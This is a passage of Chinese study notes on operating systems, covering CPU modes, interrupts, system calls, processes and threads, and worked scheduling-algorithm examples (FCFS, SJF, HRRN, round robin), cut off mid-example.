操作系统的运行机制和体系结构\n\n$$\n操作系统的运行机制和体系结构\n\\begin{cases}\n运行机制\\begin{cases}两种指令\\begin{cases}特权指令：不允许用户程序使用\\\\非特权指令\\end{cases}\\\\\n两种处理器状态\\begin{cases}核心态(管态)：特权指令、非特权指令都可执行\\\\用户态(目态)：此时CPU只能执行非特权指令\\end{cases}\\\\\n两种程序\\begin{cases}内核程序：运行在核心态\\\\应用程序：运行在用户态\\end{cases}\\end{cases}\\\\\n操作系统内核\\begin{cases}时钟管理：实现计时功能\\\\中断处理：负责实现中断机制\\\\原语\\begin{cases}是一种特殊的程序\\\\处于操作系统最底层，是最接近硬件的部分\\\\这种程序的运行具有原子性——其运行只能一气呵成，不可中断\\\\运行时间较短，调用频繁\\end{cases}\\\\对系统资源进行管理的功能\\begin{cases}进程管理\\\\存储器管理\\\\设备管理\\end{cases}\\end{cases}\\\\\n操作系统的体系结构\\begin{cases}大内核\\begin{cases}将操作系统的主要功能模块都作为系统内核，运行在核心态\\\\优点：高性能\\\\缺点：内核代码庞大，结构混乱，难以维护\\end{cases}\\\\微内核\\begin{cases}只把最基本的功能保留在内核\\\\优点：内核功能少，结构清晰，方便维护\\\\缺点：需要频繁地在核心态和用户态之间切换，性能低\\end{cases}\\end{cases}\n\\end{cases}\n$$\n\n## 1.5 中断和异常\n\n发生了中断，意味着需要操作系统的介入，开展管理工作。由于操作系统的管理工作(比如进程切换、分配I/O设备等)需要使用特权指令，因此CPU要从用户态转为核心态。中断可以使CPU从用户态切换为核心态，使操作系统获得计算机的控制权。有了中断，才能实现多道程序并发执行。\n\n用户态、核心态之间的切换是怎么实现的？\n\n答：用户态 -> 核心态是通过中断实现的，并且**中断**是**唯一**途径。\n\n​\t\t核心态 -> 用户态的切换是通过执行一个特权指令，将程序状态字的标志位设置为“用户态”。\n\n### 1.5.1 中断的分类\n\n$$\n中断\n\\begin{cases}内中断(也称异常、例外、陷入)\\begin{cases}自愿中断——指令中断，如系统调用时使用的访管指令\\\\强迫中断\\begin{cases}硬件故障，如缺页\\\\软件中断，如整数除0\\end{cases}\\end{cases}\\\\外中断(中断)\\begin{cases}外设请求，如I/O操作完成发出的中断信号\\\\人工干预，如用户强行终止一个进程\\end{cases}\\end{cases}\n$$\n\n内中断信号来源于CPU内部，与当前执行的指令有关；外中断信号来源于CPU外部，与当前执行的指令无关。\n\n### 1.5.2 外中断的处理过程\n\n1. 每条指令执行结束后，CPU检查是否有外部中断信号\n2. 若有外部中断信号，则需要保护被中断进程的CPU环境\n3. 根据中断信号类型转入相应的中断处理程序\n4. 恢复原进程的CPU环境并退出中断，返回原进程继续往下执行\n\n## 1.6 系统调用\n\n系统调用是操作系统提供给应用程序(程序员/编程人员)使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。\n\n应用程序通过系统调用请求操作系统。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作(如存储分配、I/O操作、文件管理等)，都必须通过系统调用的方式向操作系统提出服务请求，由操作系统代为完成。这样可以保证系统的稳定性和安全性，防止用户进行非法操作。\n$$\n系统调用(按功能分类)\\begin{cases}设备管理：完成设备的请求/释放/启动等功能\\\\\n文件管理：完成文件的读/写/创建/删除等功能\\\\\n进程控制：完成进程的创建/撤销/阻塞/唤醒等功能\\\\\n进程通信：完成进程之间消息传递/信号传递等功能\\\\\n内存管理：完成内存的分配/回收等功能\\end{cases}\n$$\n系统调用相关处理涉及到对系统资源的管理、对进程的控制，这些功能需要执行一些特权指令才能完成，因此系统调用的相关处理需要在核心态下完成。\n\n### 1.6.1 系统调用和库函数的区别\n\n系统调用是操作系统向上层提供的接口，有的库函数是对系统调用的进一步封装，当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用。\n\n### 1.6.2 系统调用背后的过程\n\n1. 传递系统调用参数\n2. 执行陷入指令(如int 0x80)（用户态）\n3. 执行系统调用相应服务程序（核心态）\n4. 返回用户程序\n\n陷入指令是唯一一个只能在用户态执行，而不可在核心态执行的指令。\n\n# 2. 进程\n\n**程序段、数据段、PCB(进程控制块)**三部分组成了**进程实体(进程映像)**。一般情况下，我们把进程实体就简称为进程。**PCB是进程存在的唯一标志。**\n$$\nPCB\\begin{cases}进程描述信息\\begin{cases}进程标识符PID\\\\用户标识符UID\\end{cases}\\\\\n进程控制和管理信息\\begin{cases}进程当前状态\\\\进程优先级\\end{cases}\\\\\n资源分配清单\\begin{cases}程序段指针\\\\数据段指针\\\\键盘\\\\鼠标\\end{cases}\\\\\n处理机相关信息\\begin{cases}各种寄存器值\\end{cases}\\end{cases}\n$$\n\n## 2.1 进程的组成\n\n$$\n进程的组成\n\\begin{cases}PCB\\begin{cases}进程描述信息\\\\进程控制和管理信息\\\\资源分配清单\\\\处理机相关信息\\end{cases}\\\\程序段：存放要执行的代码\\\\数据段：存放程序运行过程中处理的各种数据\\end{cases}\n$$\n\n操作系统所需的数据在PCB中，程序本身运行所需的数据在程序段和数据段中。\n\n## 2.2 进程的组织\n\n在一个系统中，通常有数十、数百乃至数千个PCB。为了能对它们加以有效的管理，应该用适当的方式把这些PCB组织起来。\n$$\n进程的组织方式\\begin{cases}链接方式\\begin{cases}按照进程状态将PCB分为多个队列\\\\操作系统持有指向各个队列的指针\\end{cases}\\\\索引方式\\begin{cases}根据进程状态的不同，建立几张索引表\\\\操作系统持有指向各个索引表的指针\\end{cases}\\end{cases}\n$$\n\n## 2.3 进程的特征\n\n- 动态性：进程最基本的特征，进程是程序的一次执行过程，是动态地产生、变化和消亡的\n- 并发性：内存中有多个进程实体，各进程可并发执行\n- 独立性：进程是能独立运行、独立获得资源、独立接受调度的基本单位\n- 异步性：各进程按各自独立的、不可预知的速度向前推进。异步性会导致并发程序执行结果的不确定性\n- 结构性：每个进程都会配置一个PCB，从结构上看，进程由程序段、数据段和PCB组成\n\n## 2.4 进程的状态\n\n$$\n进程的状态和转换\\begin{cases}状态\\begin{cases}运行状态：占有CPU，并在CPU上运行\\\\就绪状态：已经具备运行条件，但由于没有空闲CPU，而暂时不能运行\\\\阻塞状态：因等待某一事件而暂时不能运行\\\\创建状态：进程正在被创建，操作系统为进程分配资源，初始化PCB\\\\终止状态：进程正在从系统中撤销，操作系统会回收进程拥有的资源，撤销PCB\\end{cases}\\\\进程状态间的转换\\begin{cases}就绪态\\to 运行态：进程被调度\\\\\n运行态\\to就绪态：时间片到，或CPU被其他高优先级的进程抢占\\\\\n运行态\\to 阻塞态：等待系统资源分配，或等待某事件发生(主动行为)\\\\\n阻塞态\\to 就绪态：资源分配到位，等待的时间发生(被动行为)\\end{cases}\\end{cases}\n$$\n\n单核处理机环境下，每一时刻最多只有一个进程处于运行态。如果是双核，则最多两个，以此类推。\n\n注意：不能由阻塞态直接转换为运行态，也不能由就绪态直接转换为阻塞态。因为进入阻塞态是进程主动请求的，必然需要进程在运行时才能发出这种请求。\n\n## 2.5 进程控制\n\n进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能。\n\n用原语实现进程控制。原语的特点是执行期间不允许中断，只能一气呵成。这种不可被中断的操作即原子操作。原语采用“关中断指令”和“开中断指令”实现。\n$$\n进程的创建\\begin{cases}创建原语\\begin{cases}1.申请空白PCB\\\\2.为新进程分配所需资源\\\\3.初始化PCB\\\\4.将PCB插入就绪队列\\end{cases}\\\\引起进程创建的事件\\begin{cases}用户登录：分时系统中，用户登录成功，系统会为其建立一个新的进程\\\\\n作业调度：多道批处理系统中，有新的作业放入内存时，会为其建立一个新的进程\\\\\n提供服务：用户向操作系统提出某些请求时，会新建一个进程处理该请求\\\\\n应用请求：由用户进程主动请求创建一个子进程\n\\end{cases}\\end{cases}\n$$\n\n$$\n进程的终止\\begin{cases}撤销原语\\begin{cases}1.从PCB集合中找到终止进程的PCB\\\\\n2.若进程正在运行，立即剥夺CPU，将CPU分配给其他进程\\\\\n3.终止其所有子进程\\\\\n4.将该进程拥有的所有资源归还给父进程或操作系统\\\\\n5.删除PCB\\end{cases}\\\\引起进程终止的事件\\begin{cases}正常结束\\\\\n异常结束\\\\\n外界干预\\end{cases}\\end{cases}\n$$\n\n$$\n进程的阻塞\\begin{cases}阻塞原语\\begin{cases}1.找到要阻塞的进程对应的PCB\\\\\n2.保护进程运行现场，将PCB状态信息设置为阻塞态，暂时停止进程运行\\\\3.将PCB插入相应事件的等待队列\\end{cases}\\\\\n引起进程阻塞的事件\\begin{cases}需要等待系统分配某种资源\\\\需要等待相互合作的其它进程完成工作\\end{cases}\\end{cases}\n$$\n\n$$\n进程的唤醒\\begin{cases}唤醒原语\\begin{cases}1.在事件等待队列中找到PCB\\\\2.将PCB从等待队列移除，设置进程为就绪态\\\\3.将PCB插入就绪队列，等待被调度\\end{cases}\\\\引起进程唤醒的事件：等待的事件发生\\end{cases}\n$$\n\n阻塞原语唤醒原语必须成对使用。\n$$\n进程的切换\\begin{cases}切换原语\\begin{cases}1.将运行环境信息存入PCB\\\\\n2.PCB移入相应队列\\\\3.选择另一个进程执行，并更新其PCB\\\\4.根据PCB恢复新进程所需的运行环境\\end{cases}\\\\引起进程切换的事件\\begin{cases}当前进程时间片到\\\\有更高优先级的进程到达\\\\当前进程主动阻塞\\\\当前进程终止\\end{cases}\\end{cases}\n$$\n\n## 2.6 进程通信\n\n$$\n进程通信\\begin{cases}共享存储\\begin{cases}基于数据结构的共享\\\\\n基于存储区的共享\\end{cases}\\\\\n消息传递\\begin{cases}直接通信方式：消息直接挂到接收方的消息队列里\\\\间接通信方式：消息先发到中间体(信箱)\\end{cases}\\\\\n管道通信\\begin{cases}一个管道只能实现半双工通道\\\\\n写满时，不能再写。读空时，不能再读\\\\\n没写满，不能读。没读空，不能写\\end{cases}\\end{cases}\n$$\n\n进程通信就是指进程之间的信息交换。进程是分配系统资源的单位(包括内存地址空间)，因此各进程拥有的内存地址空间相互独立。\n\n为了保证安全，一个进程不能直接访问另一个进程的地址空间。但是进程之间的信息交换又是必须实现的，为了保证进程间的安全通信，操作系统提供了一些方法。\n\n### 2.6.1 共享存储\n\n两个进程对共享空间的访问必须是互斥的。\n\n基于数据结构的共享：比如共享空间里只能放一个长度为10的数组。这种共享方式速度慢、限制多，是一种低级通信方式。\n\n基于存储区的共享：在内存中画出一块共享存储区，数据的形式、存放位置都由进程控制，而不是操作系统。相比之下，这种共享方式速度更快，是一种高级通信方式。\n\n### 2.6.2 管道通信\n\n“管道”是指用于连接读写进程的一个共享文件，又名pipe文件。其实就是在内存中开辟一个大小固定的缓冲区。\n\n1. 管道只能采用半双工通信，某一时间段内只能实现单向的传输。如果要实现双向同时通信，则需要设置两个管道。\n\n2. 各进程要互斥地访问管道。\n\n3. 数据以字符流的形式写入管道，当管道写满时，写进程的write() 系统调用将被阻塞，等待读进程将数据取走。当读进程将数据全部取走后，管道变空，此时读进程的read() 系统调用将被阻塞。（缓冲区的特性）\n\n4. 如果没写满，就不允许读。如果没读空，就不允许写。（缓冲区的特性）\n\n5. 数据一旦被读出，就从管道中被抛弃，这就意味着读进程最多只能有一个，否则可能会有读错数据的情况。\n\n### 2.6.3 消息传递\n\n进程间的数据交换以格式化的消息（Message）为单位。进程通过操作系统提供的“发送消息/接收消息”两个原语进行数据交换。\n\n- 直接消息传递：消息直接挂到接收进程的消息缓冲队列上\n- 间接消息传递：消息要先发送到中间实体(信箱)中，因此也称“信箱通信方式”。如：计网中的电子邮件系统\n\n## 2.7 线程\n\n有的进程可能需要“同时”做很多事，而传统的进程只能串行地执行一系列程序。为此，引入了“线程”，来增加并发度。可以把线程理解为“轻量级进程”。\n\n**线程是一个基本的CPU执行单元，也是程序执行流的最小单位**。引入线程之后，不仅是进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务。引入线程后，进程只作为除CPU之外的系统资源的分配单元。\n\n### 2.7.1 线程的实现方式\n\n用户级线程由应用程序通过线程库实现。所有的线程管理工作都由应用程序负责(包括线程切换)，用户级线程中，线程切换可以在用户态下即可完成，无需操作系统干预。\n\n内核级线程的管理工作由操作系统内核完成。线程调度、切换等工作都由内核负责，因此内核级线程的切换必然需要在核心态下才能完成。\n\n注意：操作系统只“看得见”内核级线程，因此只有内核级线程才是处理机分配的单位。\n\n### 2.7.2 多线程模型\n\n在同时支持用户级线程和内核级线程的系统中，由几个用户级线程映射到几个内核级线程的问题引出了“多线程模型”问题。\n\n多对一模型：多个用户级线程映射到一个内核级线程。每个用户进程只对应一个内核级线程。\n\n> 优点：用户级线程的切换在用户空间即可完成，不需要切换到核心态，线程管理的系统开销小，效率高\n>\n> 缺点：当一个用户级线程被阻塞后，整个进程都会被阻塞，并发度不高。多个线程不可在多核处理机上并行运行\n\n一对一模型：一个用户级线程映射到一个内核级线程。每个用户进程有与用户级线程同数量的内核级线程。\n\n> 优点：当一个线程被阻塞后，别的线程还可以继续执行，并发能力强。多线程可在多核处理机上并行执行\n>\n> 缺点：一个用户进程会占用多个内核级线程，线程切换由操作系统内核完成，需要切换到核心态，因此线程管理的成本高，开销大\n\n多对多模型：n 用户级线程映射到m 个内核级线程（n >= m）。每个用户进程对应 m 个内核级线程。\n\n> 优点：克服了多对一模型并发度不高的缺点(一个阻塞全体阻塞)，又克服了一对一模型中一个用户进程占用太多内核级线程，开销太大的缺点\n\n## 2.8 处理机调度\n\n当有一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序，这就是“调度”研究的问题。\n\n在多道程序系统中，进程的数量往往是多于处理机的个数的，这样不可能同时并行地处理各个进程。处理机调度，就是从就绪队列中按照一定的算法选择一个进程并将处理机分配给它运行，以实现进程的并发执行。\n\n### 2.8.1 调度的三个层次\n\n#### 2.8.1.1 高级调度(作业调度)\n\n由于内存空间有限，有时无法将用户提交的作业全部放入内存，因此就需要确定某种规则来决定将作业调入内存的顺序。\n\n高级调度（作业调度），按一定的原则从外存上处于后备队列的作业中挑选一个（或多个）作业，给他们分配内存等必要资源，并建立相应的进程（建立PCB），以使它（们）获得竞争处理机的权利。\n\n高级调度是辅存（外存）与内存之间的调度。每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，但调出的时机必然是作业运行结束才调出。\n\n#### 2.8.1.2 中级调度(内存调度)\n\n引入了虚拟存储技术之后，可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存又稍有空闲时，再重新调入内存。这么做的目的是为了提高内存利用率和系统吞吐量。\n\n暂时调到外存等待的进程状态为挂起状态。值得注意的是，PCB并不会一起调到外存，而是会常驻内存。PCB中会记录进程数据在外存中的存放位置，进程状态等信息，操作系统通过内存中的PCB来保持对各个进程的监控、管理。被挂起的进程PCB会被放到的挂起队列中。\n\n中级调度（内存调度），就是要决定将哪个处于挂起状态的进程重新调入内存。\n\n一个进程可能会被多次调出、调入内存，因此中级调度发生的频率要比高级调度更高。\n\n#### 2.8.1.3 低级调度(进程调度)\n\n低级调度（进程调度），其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。\n\n进程调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置进程调度。进程调度的频率很高，一般几十毫秒一次。\n\n{% asset_img 2.8.1.png 处理机调度的三个层次 %}\n\n### 2.8.2 进程的挂起态与七状态模型\n\n暂时调到外存等待的进程状态为挂起状态（挂起态，suspend）。\n\n挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。\n\n五状态模型 -> 七状态模型\n\n{% asset_img 2.8.2.png 七状态模型 %}\n\n注意“挂起”和“阻塞”的区别，两种状态都是暂时不能获得CPU的服务，但挂起态是将进程映像调到外存去了，而阻塞态下进程映像还在内存中。\n\n有的操作系统会把就绪挂起、阻塞挂起分为两个挂起队列，甚至会根据阻塞原因不同再把阻塞挂起进程进一步细分为多个队列。\n\n### 2.8.3 进程调度的时机\n\n进程调度（低级调度），就是按照某种算法从就绪队列中选择一个进程为其分配处理机。\n\n{% asset_img 2.8.3.png 进程调度切换 %}\n\n临界资源：一个时间段内只允许一个进程使用的资源。各进程需要互斥地访问临界资源。\n\n临界区：访问临界资源的那段代码。\n\n**内核程序临界区**一般是用来访问某种内核数据结构的，比如进程的就绪队列（由各就绪进程的PCB组成）。\n\n进程在**操作系统内核程序临界区**不能进行调度与切换。（√）\n\n进程处于**临界区**时不能进行处理机调度。（×）\n\n### 2.8.4 进程调度的方式\n\n- 非剥夺调度方式，又称非抢占方式。即，只允许进程主动放弃处理机。在运行过程中即便有更紧迫的任务到达，当前进程依然会继续使用处理机，直到该进程终止或主动要求进入阻塞态。\n\n  实现简单，系统开销小但是无法及时处理紧急任务，适合于早期的批处理系统。\n\n- 剥夺调度方式，又称抢占方式。当一个进程正在处理机上执行时，如果有一个更重要或更紧迫的进程需要使用处理机，则立即暂停正在执行的进程，将处理机分配给更重要紧迫的那个进程。\n\n  可以优先处理更紧急的进程，也可实现让各进程按时间片轮流执行的功能（通过时钟中断）。适合于分时操作系统、实时操作系统。\n\n### 2.8.5 进程的切换与过程\n\n“狭义的进程调度”与“进程切换”的区别：狭义的进程调度指的是从就绪队列中选中一个要运行的进程（这个进程可以是刚刚被暂停执行的进程，也可能是另一个进程，后一种情况就需要进程切换）；进程切换是指一个进程让出处理机，由另一个进程占用处理机的过程。\n\n广义的进程调度包含了**选择一个进程**和**进程切换**两个步骤。\n\n进程切换的过程主要完成了：\n\n1. 对原来运行进程各种数据的保存\n\n2. 对新的进程各种数据的恢复\n   （如：程序计数器、程序状态字、各种数据寄存器等处理机现场信息，这些信息一般保存在进程控制块）\n\n注意：进程切换是有代价的，因此如果过于频繁的进行进程调度、切换，必然会使整个系统的效率降低，使系统大部分时间都花在了进程切换上，而真正用于执行进程的时间减少。\n\n### 2.8.6 调度算法的评价指标\n\n#### 2.8.6.1 CPU利用率\n\nCPU利用率：指CPU “忙碌”的时间占总时间的比例。\n$$\n利用率 = \\frac{忙碌的时间}{总时间}\n$$\n例：某计算机只支持单道程序，某个作业刚开始需要在CPU上运行5秒，再用打印机打印输出5秒，之后再执行5秒，才能结束。在此过程中，CPU利用率、打印机利用率分别是多少？\n$$\nCPU利用率 = \\frac{5+5}{5+5+5} = 66.6\\%\\\\\n打印机利用率 = \\frac{5}{5+5+5} = 33.3\\%\n$$\n\n#### 2.8.6.2 系统吞吐量\n\n系统吞吐量：单位时间内完成作业的数量。\n$$\n系统吞吐量 = \\frac{总共完成了多少道作业}{总共花了多少时间}\n$$\n例：某计算机系统处理完10道作业，共花费100秒，则系统吞吐量为？\n$$\n系统吞吐量 = \\frac{10}{100}=0.1道/秒\n$$\n\n#### 2.8.6.3 周转时间\n\n周转时间：从作业被提交给系统开始，到作业完成为止的这段时间间隔。\n\n它包括四个部分：\n\n- 作业在外存后备队列上等待作业调度（高级调度）的时间\n- 进程在就绪队列上等待进程调度（低级调度）的时间\n- 进程在CPU上执行的时间\n- 进程等待I/O操作完成的时间\n\n后三项在一个作业的整个处理过程中，可能发生多次。\n\n对于用户来说，更关心自己的单个作业的周转时间：\n$$\n周转时间 = 作业完成时间 - 作业提交时间\n$$\n对于操作系统来说，更关心系统的整体表现，因此更关心所有作业周转时间的平均值：\n$$\n平均周转时间 = \\frac{各作业周转时间之和}{作业数}\n$$\n对于周转时间相同的两个作业，实际运行时间长的作业在相同时间内被服务的时间更多，带权周转时间更小，用户满意度更高：\n$$\n带权周转时间 = \\frac{周转时间}{作业实际运行的时间} = \\frac{作业完成时间 - 作业提交时间}{作业实际运行的时间}\n$$\n平均带权周转时间：\n$$\n平均带权周转时间 = \\frac{各作业带权周转时间之和}{作业数}\n$$\n\n#### 2.8.6.4 等待时间\n\n计算机的用户希望自己的作业尽可能少的等待处理机。\n\n等待时间：指进程/作业处于等待处理机状态时间之和，等待时间越长，用户满意度越低。\n\n对于进程来说，等待时间就是指进程建立后等待被服务的时间之和，在等待I/O完成的期间其实进程也是在被服务的，所以不计入等待时间。\n\n对于作业来说，不仅要考虑建立进程后的等待时间，还要加上作业在外存后备队列中等待的时间。\n\n一个作业总共需要被CPU服务多久，被I/O设备服务多久一般是确定不变的，因此调度算法其实只会影响作业/进程的等待时间。当然，与前面指标类似，也有“平均等待时间”来评价整体性能。\n\n#### 2.8.6.5 响应时间\n\n对于计算机用户来说，会希望自己的提交的请求（比如通过键盘输入了一个调试命令）尽早地开始被系统服务、回应。\n\n响应时间：指从用户提交请求到首次产生响应所用的时间。\n\n### 2.8.7 调度算法\n\nTips：各种调度算法的学习思路\n\n1. 算法思想\n2. 算法规则\n3. 这种调度算法是用于作业调度还是进程调度？\n4. 抢占式？非抢占式？\n5. 优点和缺点\n6. 是否会导致饥饿\n\n饥饿：某进程 / 作业长期得不到服务。\n\n#### 2.8.7.1 FCFS(先来先服务)\n\n算法思想：主要从“公平”的角度考虑\n\n算法规则：按照作业 / 进程到达的先后顺序进行服务\n\n用于作业 / 进程调度：用于作业调度时，考虑的是哪个作业先到达后备队列；用于进程调度时，考虑的是哪个进程先到达就绪队列\n\n是否可抢占：非抢占式的算法\n\n优点：公平、算法实现简单\n\n缺点：排在长作业（进程）后面的短作业需要等待很长时间，带权周转时间很大，对短作业来说用户体验不好。即，FCFS算法对长作业有利，对短作业不利\n\n是否会导致饥饿：不会产生饥饿现象\n\n例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用FCFS调度算法，计算各进程的等待时间、平均等待时间、周转时间、平均周转时间、带权周转时间、平均带权周转时间。\n\n| 进程 | 到达时间 | 运行时间 |\n| ---- | -------- | -------- |\n| P1   | 0        | 7        |\n| P2   | 2        | 4        |\n| P3   | 4        | 1        |\n| P4   | 5        | 4        |\n\nFCFS，所以调度顺序为：P1->P2->P3->P4\n\n周转时间 = 作业完成时间 - 作业提交(到达)时间\n$$\nP1=7-0=7\\\\\nP2=(7+4) - 2=9\\\\\nP3=(7+4+1)-4=8\\\\\nP4=(7+4+1+4)-5=11\n$$\n平均周转时间 = 周转时间之和 / 作业数\n$$\n平均周转时间 = \\frac{7+9+8+11}{4}=8.75\n$$\n带权周转时间 = 周转时间 / 作业实际运行的时间\n$$\nP1=\\frac{7}{7} =1\\\\\nP2=\\frac{9}{4}=2.25\\\\\nP3=\\frac{8}{1}=8\\\\\nP4=\\frac{11}{4}=2.75\n$$\n平均带权周转时间 = 带权周转时间之和 / 作业数\n$$\n平均带权周转时间 = \\frac{1+2.25+8+2.75}4=3.5\n$$\n等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)\n$$\nP1=7-7=0\\\\\nP2=9-4=5\\\\\nP3=8-1=7\\\\\nP4=11-4=7\n$$\n平均等待时间 = 总等待时间 / 作业数\n$$\n平均等待时间 = \\frac{0+5+7+7}{4}=4.75\n$$\n\n#### 2.8.7.2 SJF(短作业优先)\n\n算法思想：追求最少的平均等待时间，最少的平均周转时间、最少的平均平均带权周转时间\n\n算法规则：最短的作业 / 进程优先得到服务（所谓“最短”，是指要求服务时间最短）\n\n用于作业 / 进程调度：即可用于作业调度，也可用于进程调度。用于进程调度时称为“短进程优先(SPF, Shortest Process First)算法”\n\n是否可抢占：SJF和SPF是非抢占式的算法。但是也有抢占式的版本——最短剩余时间优先算法(SRTN, Shortest Remaining Time Next)\n\n优点：“最短的”平均等待时间、平均周转时间\n\n缺点：不公平。对短作业有利，对长作业不利。可能产生饥饿现象。另外，作业/进程的运行时间是由用户提供的，并不一定真实，不一定能做到真正的短作业优先\n\n是否会导致饥饿：会产生饥饿现象。如果源源不断地有短作业/进程到来，可能使长作业/进程长时间得不到服务，产生“饥饿”现象。如果一直得不到服务，则称为“饿死”\n\n例：例题同上，使用**非抢占式**的短作业优先算法。\n\n短作业/进程优先调度算法：每次调度时选择**当前已到达**且**运行时间最短**的作业/进程。所以，调度顺序为：P1->P3->P2->P4\n\n例：例题同上，使用**抢占式**的短作业优先算法。\n\n最短剩余时间优先算法：每当有进程加入就绪队列改变时就需要调度，如果新到达的进程剩余时间比当前运行的进程剩余时间更短，则由新进程抢占处理机，当前运行进程重新回到就绪队列。另外，当一个进程完成时也需要调度。\n\n需要注意的是，当有新进程到达时就绪队列就会改变，就要按照上述规则进行检查。以下$P_n(m)$表示当前$P_n$进程剩余时间为m。各个时刻的情况如下：\n\n0时刻(P1到达)：$P_1(7)$\n\n2时刻(P2到达)：$P_1(5),P_2(4)$\n\n4时刻(P3到达)：$P_1(5),P_2(2),P_1(1)$\n\n5时刻(P3完成且P4到达)：$P_1(5),P_2(2),P_4(4)$\n\n7时刻(P2完成)：$P_1(5),P_4(4)$\n\n11时刻(P4完成)：$P_1(5)$\n\n16时刻(P1完成)\n\n周转时间 = 作业完成时间 - 作业提交(到达)时间：\n$$\nP1=16-0=16\\\\\nP2=7-2=5\\\\\nP3=5-4=1\\\\\nP4=11-5=6\n$$\n带权周转时间 = 周转时间 / 作业实际运行的时间：\n$$\nP1=\\frac{16}{7}=2.28\\\\\nP2=\\frac{5}{4}=1.25\\\\\nP3=\\frac{1}{1}=1\\\\\nP4=\\frac{6}{4}=1.5\n$$\n等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)：\n$$\nP1=16-7=9\\\\\nP2=5-4=1\\\\\nP3=1-1=0\\\\\nP4=6-4=2\n$$\n\n#### 2.8.7.3 HRRN(高相应比优先)\n\n算法思想：综合考虑作业/进程的等待时间和要求服务的时间\n\n算法规则：在每次调度时先计算各个作业/进程的响应比，选择响应比最高的作业/进程为其服务\n$$\n响应比 = \\frac{等待时间+要求服务时间}{要求服务时间}\n$$\n用于作业 / 进程调度：可用于作业调度，也可用于进程调度\n\n是否可抢占：非抢占式的算法，因此只有当前运行的作业/进程主动放弃处理机时，才需要调度，才需要计算响应比\n\n优点：综合考虑了等待时间和运行时间(要求服务时间)；等待时间相同时，要求服务时间短的优先(SJF的优点)；要求服务时间相同时，等待时间长的优先(FCFS的优点)；对于长作业来说，随着等待时间越来越久，其响应比也会越来越大，从而避免了长作业饥饿的问题\n\n是否会导致饥饿：不会\n\n例：例题同上，使用高响应比优先算法。\n\n0时刻：只有$P_1$到达就绪队列，$P_1$上处理机\n\n7时刻(P1主动放弃CPU)：就绪队列中有$P_2(响应比=\\frac{(7-2)+4}{4}=2.25)$、$P_3(响应比=\\frac{(7-4)+1}1=4)$、$P_4(响应比=\\frac{(7-5)+4}{4}=1.5)$\n\n8时刻(P3完成)：$P_2(响应比=\\frac{(8-2)+4}{4}=2.5)$、$P_4(响应比=\\frac{(8-5)+4}{4}=1.75)$\n\n12时刻(P2完成)：就绪队列中只剩下$P_4$\n\n16时刻(P4完成)\n\n#### 2.8.7.4 时间片轮转调度算法(RR)\n\n算法思想：公平地、轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应\n\n算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列队尾重新排队\n\n用于作业 / 进程调度：用于进程调度(只有作业放入内存建立了相应的进程后，才能被分配处理机时间片)\n\n是否可抢占：若进程未能在时间片内运行完，将被强行剥夺处理机使用权，因此时间片轮转调度算法属于抢占式的算法。由时钟装置发出时钟中断来通知CPU时间片已到\n\n优点：公平、响应快，适用于分时操作系统\n\n缺点：由于高频率的进程切换，因此有一定开销，不区分任务的紧急程度\n\n是否会导致饥饿：不会\n\n例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用时间片轮转调度算法，分析时间片大小分别是2、5时的进程运行情况。\n\n**时间片轮转常用于分时操作系统，更注重“响应时间”，因而此处不计算周转时间。**\n\n| 进程 | 到达时间 | 运行时间 |\n| ---- | -------- | -------- |\n| P1   | 0        | 5        |\n| P2   | 2        | 4        |\n| P3   | 4        | 1        |\n| P4   | 5        | 6        |\n\n**时间片大小为2**（注：以下括号内表示当前时刻就绪队列中的进程、进程的剩余运行时间）\n\n0时刻(P1(5))：0时刻只有P1到达就绪队列，让P1上处理机运行一个时间片\n\n2时刻(P2(4) -> P1(3))：2时刻P2到达就绪队列，P1运行完一个时间片，被剥夺处理机，重新放到队尾。此时P2排在队头，因此让P2上处理机。（注意：2时刻，P1下处理机，同一时刻新进程P2到达，如果在题目中遇到这种情况，默认新到达的进程先进入就绪队列）\n\n4时刻(P1(3) -> P3(1) -> P2(2))：4时刻P3到达，先插到就绪队尾，紧接着P2下处理机也插到队尾\n\n5时刻(P3(1) -> P2(2) -> P4(6))：5时刻P4到达插到就绪队尾（注意：由于P1的时间片还没用完，因此暂时不调度。另外，此时P1处于运行态，并不在就绪队列中）\n\n6时刻(P3(1) -> P2(2) -> P4(6) -> P1(1))：6时刻，P1时间片用完，下处理机，重新放回就绪队尾，发生调度\n\n7时刻(P2(2) -> P4(6) -> P1(1))：虽然P3的时间片没用完，但是由于P3只需运行1各单位的时间。运行完了会主动放弃处理机，因此也会发生调度。队头进程P2上处理机\n\n9时刻(P4(6) -> P1(1))：进程P2时间片用完，并刚好运行完，发生调度，P4上处理机\n\n11时刻(P1(1) -> P4(4))：P4时间片用完，重新回到就绪队列。P1上处理机\n\n12时刻(P4(4))：P1运行完，主动放弃处理机，此时就绪队列中只剩P4，P4上处理机\n\n14时刻()：就绪队列为空，因此让P4接着运行一个时间片\n\n16时刻：所有进程运行结束\n\n**时间片大小为5**\n\n0时刻(P1(5))：只有P1到达，P1上处理机\n\n2时刻(P2(4))：P2到达，但P1时间片尚未结束，因此暂不调度\n\n4时刻(P2(4) -> P3(1))：P3到达，但P1时间片尚未结束，因此暂不调度\n\n5时刻(P2(4) -> P3(1) -> P4(6))：P4到达，同时P1运行结束。发生调度，P2上处理机\n\n9时刻(P3(1) -> 